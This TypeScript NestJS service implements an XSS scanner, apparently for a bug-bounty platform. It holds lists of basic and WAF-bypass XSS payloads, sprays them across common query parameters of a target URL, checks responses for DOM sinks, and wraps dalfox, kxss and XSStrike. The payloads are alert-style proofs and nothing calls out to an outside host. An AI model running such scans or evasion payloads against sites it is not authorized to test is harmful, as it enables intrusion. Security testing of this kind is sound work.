import { Injectable, Logger } from '@nestjs/common';
import { InjectModel } from '@nestjs/mongoose';
import { Model, Types } from 'mongoose';
import { spawn } from 'child_process';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import axios from 'axios';
import { XssScan, XssScanDocument, XssResult, ScanLog } from '../../../schemas/xss-scan.schema';

export interface XssScanConfig {
  url: string;
  tools?: string[];
  customPayloads?: string[];
  crawl?: boolean;
  depth?: number;
  threads?: number;
  timeout?: number;
  wafBypass?: boolean;
  blindXss?: string;
  headers?: Record<string, string>;
  cookies?: string;
}

@Injectable()
export class XssService {
  private readonly logger = new Logger(XssService.name);
  private readonly userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
  private runningScans: Map<string, any> = new Map();

  // Common XSS payloads for manual testing
  private readonly basicPayloads = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<iframe src="javascript:alert(1)">',
  ];

  // WAF bypass payloads
  private readonly wafBypassPayloads = [
    '<svg/onload=alert(1)>',
    '<img src=x onerror=alert`1`>',
    '<svg onload=alert&#40;1&#41;>',
    '<img src=x onerror=\\u0061lert(1)>',
    '<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>',
    '"><img src=x onerror=alert(String.fromCharCode(88,83,83))>',
    '<d3v/onmouseleave=[1].some(confirm)>click',
    '<details/open/ontoggle=alert(origin)>',
    '<a href=javascript&colon;alert(1)>click',
    '<svg><animate onbegin=alert(1) attributeName=x>',
  ];

  // DOM XSS sinks to check
  private readonly domSinks = [
    'document.write',
    'document.writeln',
    'innerHTML',
    'outerHTML',
    'insertAdjacentHTML',
    'eval',
    'setTimeout',
    'setInterval',
    'Function',
    'location',
    'location.href',
    'location.replace',
    'location.assign',
    'window.open',
  ];

  constructor(
    @InjectModel(XssScan.name) private xssScanModel: Model<XssScanDocument>,
  ) {}

  private async addLog(scan: XssScanDocument, level: ScanLog['level'], message: string, details?: string): Promise<void> {
    const log: ScanLog = {
      timestamp: new Date(),
      level,
      message,
      details,
    };
    scan.logs.push(log);
    await scan.save();
    this.logger.log(`[${scan._id}] ${level.toUpperCase()}: ${message}`);
  }

  async startScan(config: XssScanConfig, userId: string, programId?: string): Promise<XssScanDocument> {
    const scan = new this.xssScanModel({
      url: config.url,
      userId: new Types.ObjectId(userId),
      programId: programId ? new Types.ObjectId(programId) : undefined,
      status: 'pending',
      config: {
        tools: config.tools || ['builtin'],
        customPayloads: config.customPayloads,
        crawl: config.crawl ?? false,
        depth: config.depth ?? 2,
        threads: config.threads ?? 10,
        timeout: config.timeout ?? 30,
        wafBypass: config.wafBypass ?? false,
        blindXss: config.blindXss,
        headers: config.headers,
        cookies: config.cookies,
      },
      results: [],
      logs: [],
    });

    await scan.save();
    this.runScan(scan);
    return scan;
  }


  private async runScan(scan: XssScanDocument): Promise<void> {
    try {
      scan.status = 'running';
      scan.startedAt = new Date();
      scan.currentPhase = 'Initializing';
      await scan.save();

      await this.addLog(scan, 'info', `Starting XSS scan on ${scan.url}`);
      await this.addLog(scan, 'info', `Tools selected: ${scan.config.tools.join(', ')}`);
      if (scan.config.wafBypass) {
        await this.addLog(scan, 'info', 'WAF bypass mode enabled');
      }

      const results: XssResult[] = [];
      const tools = scan.config.tools || ['builtin'];

      // Run built-in scanner
      if (tools.includes('builtin')) {
        scan.currentPhase = 'Running builtin scanner';
        await scan.save();
        await this.addLog(scan, 'info', 'Starting builtin XSS scanner...');
        const builtinResults = await this.runBuiltinScanner(scan);
        results.push(...builtinResults);
        await this.addLog(scan, 'success', `Builtin scanner completed: ${builtinResults.length} findings`);
      }

      // Run dalfox if available
      if (tools.includes('dalfox')) {
        scan.currentPhase = 'Running dalfox';
        await scan.save();
        await this.addLog(scan, 'info', 'Starting dalfox scanner...');
        const dalfoxResults = await this.runDalfox(scan);
        results.push(...dalfoxResults);
        if (dalfoxResults.length > 0) {
          await this.addLog(scan, 'success', `Dalfox completed: ${dalfoxResults.length} findings`);
        } else {
          await this.addLog(scan, 'info', 'Dalfox completed: no findings');
        }
      }

      // Run kxss if available
      if (tools.includes('kxss')) {
        scan.currentPhase = 'Running kxss';
        await scan.save();
        await this.addLog(scan, 'info', 'Starting kxss scanner...');
        const kxssResults = await this.runKxss(scan);
        results.push(...kxssResults);
        if (kxssResults.length > 0) {
          await this.addLog(scan, 'success', `kxss completed: ${kxssResults.length} findings`);
        } else {
          await this.addLog(scan, 'info', 'kxss completed: no findings');
        }
      }

      // Run XSStrike if available
      if (tools.includes('xsstrike')) {
        scan.currentPhase = 'Running XSStrike';
        await scan.save();
        await this.addLog(scan, 'info', 'Starting XSStrike scanner...');
        const xsstrikeResults = await this.runXsstrike(scan);
        results.push(...xsstrikeResults);
        if (xsstrikeResults.length > 0) {
          await this.addLog(scan, 'success', `XSStrike completed: ${xsstrikeResults.length} findings`);
        } else {
          await this.addLog(scan, 'info', 'XSStrike completed: no findings');
        }
      }

      // Deduplicate results
      const uniqueResults = this.deduplicateResults(results);

      scan.results = uniqueResults;
      scan.vulnerabilitiesFound = uniqueResults.length;
      scan.status = 'completed';
      scan.completedAt = new Date();
      scan.currentPhase = 'Completed';
      await scan.save();

      if (uniqueResults.length > 0) {
        await this.addLog(scan, 'success', `Scan completed! Found ${uniqueResults.length} XSS vulnerabilities`);
      } else {
        await this.addLog(scan, 'info', 'Scan completed. No XSS vulnerabilities found.');
      }

    } catch (error) {
      this.logger.error(`Scan failed: ${error.message}`);
      await this.addLog(scan, 'error', `Scan failed: ${error.message}`);
      scan.status = 'failed';
      scan.error = error.message;
      scan.completedAt = new Date();
      await scan.save();
    } finally {
      this.runningScans.delete(scan._id.toString());
    }
  }

  private async runBuiltinScanner(scan: XssScanDocument): Promise<XssResult[]> {
    const results: XssResult[] = [];
    const payloads = scan.config.wafBypass 
      ? [...this.basicPayloads, ...this.wafBypassPayloads]
      : this.basicPayloads;

    // Add custom payloads
    if (scan.config.customPayloads?.length) {
      payloads.push(...scan.config.customPayloads);
    }

    const parsedUrl = new URL(scan.url);
    const commonParams = ['q', 'search', 'query', 'id', 'page', 'name', 'input', 'value', 'data', 'text', 'msg', 'message', 'content', 'url', 'redirect', 'callback'];

    // Calculate total URLs to scan
    scan.totalUrls = payloads.length * commonParams.length;
    scan.urlsScanned = 0;
    await scan.save();

    await this.addLog(scan, 'info', `Testing ${payloads.length} payloads across ${commonParams.length} parameters (${scan.totalUrls} total requests)`);

    let lastLoggedProgress = 0;

    for (const payload of payloads) {
      for (const param of commonParams) {
        try {
          const testUrl = `${parsedUrl.origin}${parsedUrl.pathname}?${param}=${encodeURIComponent(payload)}`;
          
          const headers: Record<string, string> = {
            'User-Agent': this.userAgent,
          };
          
          if (scan.config.headers) {
            Object.assign(headers, scan.config.headers);
          }
          if (scan.config.cookies) {
            headers['Cookie'] = scan.config.cookies;
          }

          const response = await axios.get(testUrl, {
            timeout: (scan.config.timeout || 30) * 1000,
            validateStatus: () => true,
            headers,
          });

          scan.urlsScanned++;
          
          // Log progress every 10%
          const progress = Math.floor((scan.urlsScanned / scan.totalUrls) * 100);
          if (progress >= lastLoggedProgress + 10) {
            await this.addLog(scan, 'info', `Progress: ${progress}% (${scan.urlsScanned}/${scan.totalUrls} requests)`);
            lastLoggedProgress = progress;
            await scan.save();
          }

          if (typeof response.data === 'string') {
            // Check for reflected payload
            if (response.data.includes(payload)) {
              const context = this.detectContext(response.data, payload);
              const result: XssResult = {
                url: testUrl,
                parameter: param,
                payload,
                type: 'reflected',
                context,
                evidence: this.extractEvidence(response.data, payload),
                severity: this.calculateSeverity(context, payload),
                wafBypassed: scan.config.wafBypass && this.wafBypassPayloads.includes(payload),
                tool: 'builtin',
              };
              results.push(result);
              await this.addLog(scan, 'success', `Found XSS! Parameter: ${param}, Context: ${context}`, payload.substring(0, 50));
            }

            // Check for DOM XSS indicators
            const domVuln = this.checkDomXss(response.data, param);
            if (domVuln) {
              results.push({
                url: testUrl,
                parameter: param,
                payload: domVuln.sink,
                type: 'dom',
                context: 'script',
                evidence: domVuln.evidence,
                severity: 'high',
                tool: 'builtin',
              });
              await this.addLog(scan, 'success', `Found DOM XSS! Sink: ${domVuln.sink}, Parameter: ${param}`);
            }
          }
        } catch (error) {
          // Log timeout/connection errors occasionally
          if (error.code === 'ECONNREFUSED' || error.code === 'ETIMEDOUT') {
            await this.addLog(scan, 'warn', `Connection issue testing parameter: ${param}`, error.message);
          }
          // Continue on error
        }
      }
    }

    // Final save
    await scan.save();

    return results;
  }

  private async runDalfox(scan: XssScanDocument): Promise<XssResult[]> {
    return new Promise(async (resolve) => {
      const results: XssResult[] = [];
      
      // Check for dalfox in multiple locations
      const goPath = process.env.GOPATH || '/root/go';
      const possiblePaths = [`${goPath}/bin/dalfox`, '/usr/local/bin/dalfox'];
      let dalfoxPath = '';
      
      for (const p of possiblePaths) {
        if (await this.isToolInstalled(p)) {
          dalfoxPath = p;
          break;
        }
      }
      
      if (!dalfoxPath) {
        await this.addLog(scan, 'warn', 'Dalfox not found');
        resolve([]);
        return;
      }

      const args = [
        'url', scan.url,
        '--silence',
        '--format', 'json',
        '-w', String(scan.config.threads || 10),
      ];

      if (scan.config.wafBypass) {
        args.push('--waf-evasion');
      }
      if (scan.config.blindXss) {
        args.push('--blind', scan.config.blindXss);
      }
      if (scan.config.cookies) {
        args.push('-C', scan.config.cookies);
      }
      if (scan.config.headers) {
        for (const [key, value] of Object.entries(scan.config.headers)) {
          args.push('-H', `${key}: ${value}`);
        }
      }

      await this.addLog(scan, 'info', `Running: dalfox ${args.slice(0, 4).join(' ')}...`);

      const childProc = spawn(dalfoxPath, args);
      let output = '';
      let stderr = '';

      childProc.stdout.on('data', (data: Buffer) => {
        output += data.toString();
      });

      childProc.stderr.on('data', (data: Buffer) => {
        stderr += data.toString();
      });

      childProc.on('close', async (code: number | null) => {
        if (code !== 0 && stderr) {
          await this.addLog(scan, 'warn', `Dalfox exited with code ${code}`, stderr.substring(0, 200));
        }
        try {
          const lines = output.trim().split('\n').filter(Boolean);
          for (const line of lines) {
            try {
              const finding = JSON.parse(line);
              if (finding.type === 'POC') {
                results.push({
                  url: finding.data || scan.url,
                  parameter: finding.param || 'unknown',
                  payload: finding.payload || '',
                  type: 'reflected',
                  context: this.mapDalfoxContext(finding.context),
                  evidence: finding.evidence,
                  severity: this.mapDalfoxSeverity(finding.severity),
                  wafBypassed: finding.waf_bypassed,
                  tool: 'dalfox',
                });
              }
            } catch {
              // Skip invalid JSON lines
            }
          }
        } catch {
          // Ignore parse errors
        }
        resolve(results);
      });

      childProc.on('error', async (err: Error) => {
        await this.addLog(scan, 'warn', 'Dalfox execution error', err.message);
        resolve([]);
      });

      // Store process for cancellation
      this.runningScans.set(scan._id.toString(), childProc);
    });
  }

  private async runKxss(scan: XssScanDocument): Promise<XssResult[]> {
    return new Promise(async (resolve) => {
      const results: XssResult[] = [];
      
      // Check for kxss in multiple locations
      const goPath = process.env.GOPATH || '/root/go';
      const possiblePaths = [`${goPath}/bin/kxss`, '/usr/local/bin/kxss'];
      let kxssPath = '';
      
      for (const p of possiblePaths) {
        if (await this.isToolInstalled(p)) {
          kxssPath = p;
          break;
        }
      }
      
      if (!kxssPath) {
        await this.addLog(scan, 'warn', 'kxss not found');
        resolve([]);
        return;
      }

      await this.addLog(scan, 'info', `Running kxss on ${scan.url}`);

      const childProc = spawn(kxssPath, [], { stdio: ['pipe', 'pipe', 'pipe'] });
      let output = '';

      childProc.stdin.write(scan.url + '\n');
      childProc.stdin.end();

      childProc.stdout.on('data', (data: Buffer) => {
        output += data.toString();
      });

      childProc.on('close', async () => {
        const lines = output.trim().split('\n').filter(Boolean);
        for (const line of lines) {
          if (line.includes('Unfiltered')) {
            const match = line.match(/param=(\w+).*char=(.+)/);
            if (match) {
              results.push({
                url: scan.url,
                parameter: match[1],
                payload: match[2],
                type: 'reflected',
                context: 'html',
                evidence: line,
                severity: 'medium',
                tool: 'kxss',
              });
            }
          }
        }
        resolve(results);
      });

      childProc.on('error', async (err: Error) => {
        await this.addLog(scan, 'warn', 'kxss execution error', err.message);
        resolve([]);
      });
    });
  }

  private async runXsstrike(scan: XssScanDocument): Promise<XssResult[]> {
    return new Promise(async (resolve) => {
      const results: XssResult[] = [];
      
      // Check for xsstrike in multiple locations
      const homePath = process.env.HOME || '/root';
      const possiblePaths = ['/usr/local/bin/xsstrike', '/opt/xsstrike/xsstrike.py', `${homePath}/.local/bin/xsstrike-run`];
      let xsstrikePath = '';
      
      for (const p of possiblePaths) {
        if (await this.isToolInstalled(p)) {
          xsstrikePath = p;
          break;
        }
      }
      
      if (!xsstrikePath) {
        await this.addLog(scan, 'warn', 'XSStrike not found');
        resolve([]);
        return;
      }

      const args = [
        '-u', scan.url,
        '--skip',
        '-t', String(scan.config.threads || 10),
      ];

      if (scan.config.crawl) {
        args.push('--crawl');
        args.push('-l', String(scan.config.depth || 2));
      }

      await this.addLog(scan, 'info', `Running XSStrike on ${scan.url}`);

      // Use python3 if it's a .py file
      const cmd = xsstrikePath.endsWith('.py') ? 'python3' : xsstrikePath;
      const cmdArgs = xsstrikePath.endsWith('.py') ? [xsstrikePath, ...args] : args;

      const childProc = spawn(cmd, cmdArgs);
      let output = '';

      childProc.stdout.on('data', (data: Buffer) => {
        output += data.toString();
      });

      childProc.on('close', async () => {
        // Parse XSStrike output
        const vulnMatches = output.matchAll(/\[VULN\].*?Parameter:\s*(\w+).*?Payload:\s*(.+)/g);
        for (const match of vulnMatches) {
          results.push({
            url: scan.url,
            parameter: match[1],
            payload: match[2],
            type: 'reflected',
            context: 'html',
            severity: 'high',
            tool: 'xsstrike',
          });
        }
        resolve(results);
      });

      childProc.on('error', async (err: Error) => {
        await this.addLog(scan, 'warn', 'XSStrike execution error', err.message);
        resolve([]);
      });
    });
  }


  private detectContext(body: string, payload: string): 'html' | 'attribute' | 'script' | 'url' | 'style' {
    const index = body.indexOf(payload);
    if (index === -1) return 'html';

    const before = body.substring(Math.max(0, index - 100), index);
    
    if (/<script[^>]*>/.test(before) && !/<\/script>/.test(before)) {
      return 'script';
    }
    if (/style\s*=\s*["'][^"']*$/.test(before) || /<style[^>]*>/.test(before)) {
      return 'style';
    }
    if (/href\s*=\s*["']?$/.test(before) || /src\s*=\s*["']?$/.test(before)) {
      return 'url';
    }
    if (/\w+\s*=\s*["'][^"']*$/.test(before)) {
      return 'attribute';
    }
    
    return 'html';
  }

  private checkDomXss(body: string, param: string): { sink: string; evidence: string } | null {
    for (const sink of this.domSinks) {
      const patterns = [
        new RegExp(`${sink}\\s*\\(.*${param}`, 'i'),
        new RegExp(`${sink}\\s*=.*${param}`, 'i'),
        new RegExp(`\\[['"]${sink}['"]\\].*${param}`, 'i'),
      ];

      for (const pattern of patterns) {
        const match = body.match(pattern);
        if (match) {
          return {
            sink,
            evidence: match[0].substring(0, 200),
          };
        }
      }
    }
    return null;
  }

  private extractEvidence(body: string, payload: string): string {
    const index = body.indexOf(payload);
    if (index === -1) return '';
    const start = Math.max(0, index - 50);
    const end = Math.min(body.length, index + payload.length + 50);
    return body.substring(start, end);
  }

  private calculateSeverity(context: string, payload: string): 'info' | 'low' | 'medium' | 'high' | 'critical' {
    if (context === 'script') return 'critical';
    if (context === 'attribute' && payload.includes('on')) return 'high';
    if (payload.includes('<script>') || payload.includes('javascript:')) return 'high';
    if (context === 'html') return 'medium';
    return 'low';
  }

  private mapDalfoxContext(context: string): 'html' | 'attribute' | 'script' | 'url' | 'style' {
    const map: Record<string, 'html' | 'attribute' | 'script' | 'url' | 'style'> = {
      'inHTML': 'html',
      'inATTR': 'attribute',
      'inJS': 'script',
      'inURL': 'url',
      'inCSS': 'style',
    };
    return map[context] || 'html';
  }

  private mapDalfoxSeverity(severity: string): 'info' | 'low' | 'medium' | 'high' | 'critical' {
    const map: Record<string, 'info' | 'low' | 'medium' | 'high' | 'critical'> = {
      'info': 'info',
      'low': 'low',
      'medium': 'medium',
      'high': 'high',
      'critical': 'critical',
    };
    return map[severity?.toLowerCase()] || 'medium';
  }

  private deduplicateResults(results: XssResult[]): XssResult[] {
    const seen = new Set<string>();
    return results.filter(r => {
      const key = `${r.url}|${r.parameter}|${r.payload}`;
      if (seen.has(key)) return false;
      seen.add(key);
      return true;
    });
  }

  async getScan(id: string): Promise<XssScanDocument | null> {
    return this.xssScanModel.findById(id);
  }

  async getScansByUser(userId: string): Promise<XssScanDocument[]> {
    return this.xssScanModel
      .find({ userId: new Types.ObjectId(userId) })
      .sort({ createdAt: -1 })
      .limit(50);
  }

  async cancelScan(id: string): Promise<XssScanDocument | null> {
    const scan = await this.xssScanModel.findById(id);
    if (!scan) return null;

    const childProc = this.runningScans.get(id);
    if (childProc) {
      childProc.kill('SIGTERM');
      this.runningScans.delete(id);
    }

    scan.status = 'cancelled';
    scan.completedAt = new Date();
    await scan.save();
    return scan;
  }

  async getAvailableTools(): Promise<{ name: string; installed: boolean; description: string }[]> {
    const tools = [
      { name: 'builtin', installed: true, description: 'Built-in XSS scanner with common payloads' },
      { name: 'dalfox', installed: false, description: 'Parameter Analysis and XSS Scanning tool' },
      { name: 'kxss', installed: false, description: 'Reflected parameter finder' },
      { name: 'xsstrike', installed: false, description: 'Advanced XSS detection suite' },
    ];

    // Check if tools are installed - check both Docker paths and local paths
    const goPath = process.env.GOPATH || '/root/go';
    const homePath = process.env.HOME || '/root';
    
    // Dalfox: check go bin path
    tools[1].installed = await this.isToolInstalled(`${goPath}/bin/dalfox`) || 
                         await this.isToolInstalled('/usr/local/bin/dalfox');
    
    // kxss: check go bin path
    tools[2].installed = await this.isToolInstalled(`${goPath}/bin/kxss`) ||
                         await this.isToolInstalled('/usr/local/bin/kxss');
    
    // XSStrike: check multiple locations
    tools[3].installed = await this.isToolInstalled('/usr/local/bin/xsstrike') ||
                         await this.isToolInstalled('/opt/xsstrike/xsstrike.py') ||
                         await this.isToolInstalled(`${homePath}/.local/bin/xsstrike-run`);

    return tools;
  }

  private getToolPath(tool: string): string {
    const goPath = process.env.GOPATH || '/root/go';
    const homePath = process.env.HOME || '/root';
    
    const paths: Record<string, string[]> = {
      'dalfox': [`${goPath}/bin/dalfox`, '/usr/local/bin/dalfox'],
      'kxss': [`${goPath}/bin/kxss`, '/usr/local/bin/kxss'],
      'xsstrike': ['/usr/local/bin/xsstrike', '/opt/xsstrike/xsstrike.py', `${homePath}/.local/bin/xsstrike-run`],
    };
    
    return paths[tool]?.[0] || tool;
  }

  private async isToolInstalled(toolPath: string): Promise<boolean> {
    return new Promise((resolve) => {
      fs.access(toolPath, fs.constants.X_OK, (err) => {
        resolve(!err);
      });
    });
  }

  // Get common XSS payloads for reference
  getPayloads(type: 'basic' | 'waf-bypass' | 'all' = 'all'): string[] {
    if (type === 'basic') return [...this.basicPayloads];
    if (type === 'waf-bypass') return [...this.wafBypassPayloads];
    return [...this.basicPayloads, ...this.wafBypassPayloads];
  }
}
